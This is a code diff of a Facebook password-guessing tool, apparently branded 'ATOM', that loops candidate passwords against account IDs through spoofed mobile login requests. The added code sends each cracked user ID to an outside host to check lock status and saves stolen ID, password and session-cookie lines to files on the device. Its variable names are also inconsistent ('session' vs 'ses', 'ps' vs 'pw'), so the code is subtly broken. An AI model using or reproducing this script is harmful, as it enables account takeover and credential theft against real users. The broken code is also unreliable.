@@ -962,36 +962,43 @@ def m2(idf,pwv):
  for pw in pwv:
   try:
    ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-   p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ff6fb-29af-412a-bb00-83c94a1003M1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
-   dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268M15bae-23f8-463c-8660-5cM1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68M15bae-23f8-463c-8660-5cM1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
+   p = ses.get('https://m.facebook.com/') 
+   dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
    koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
    koki+=' m_pixel_ratio=2.625; wd=412x756'
-   heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ff6fb-29af-412a-bb00-83c94a1003M1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-   po = ses.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=144117062837799&kid_directed_site=0&app_id=144117062837799&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fpixlr.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3Dhttps%253A%252F%252Fpixlr.com%252Fimage-generator%252F%253FredirectUpsell%253Dtrue%26client_id%3D144117062837799%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db231eb86-6aa0-48eb-a720-85934b1e5209%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fpixlr.com%252Fimage-generator%252F%253FredirectUpsell%253Dtrue%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
-   if "checkpoint" in po.cookies.get_dict().keys():
-    idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+   heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+   po = ses.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
+   if 'c_user' in ses.cookies.get_dict().keys():
+    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    user = re.findall('c_user=(.*);xs', coki)[0]
+    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+    reqx = requests.get(url).text
+    if 'live' in reqx:
+            print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
+            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            ok+=1 
+            break
+    if 'lock' in reqx:
+            print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
+            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            ok+=1 
+            break
+   elif 'checkpoint' in po.cookies.get_dict().keys():
+    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    coki1 = coki.split("1000")[1]
+    uid = "1000"+coki1[0:11]
     if 'y' in cp_xdx:
-     print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
-    open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+pw+'\n')
-    ok.append(idf+'|'+pw)
-    cp+=1
-    break
-   elif "c_user" in ses.cookies.get_dict().keys():
-    coki=po.cookies.get_dict()
-    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-    idf = re.findall('c_user=(.*);xs', kuki)[0]
-    ok+=1
-    print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
-    if 'y' in cokix:
-     print(f'\r{gen}{H}'+kuki)
-    open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(idf+'|'+pw+'\n')
-    break
+     print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{ps}{xxx}')
+    open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
+    cp.append(uid)
    else:
     continue
-  except requests.exceptions.ConnectionError:
-   time.sleep(3)
- loop+=1
-
+  loop+=1
+  
+ except:
+  pass 
 
 
 
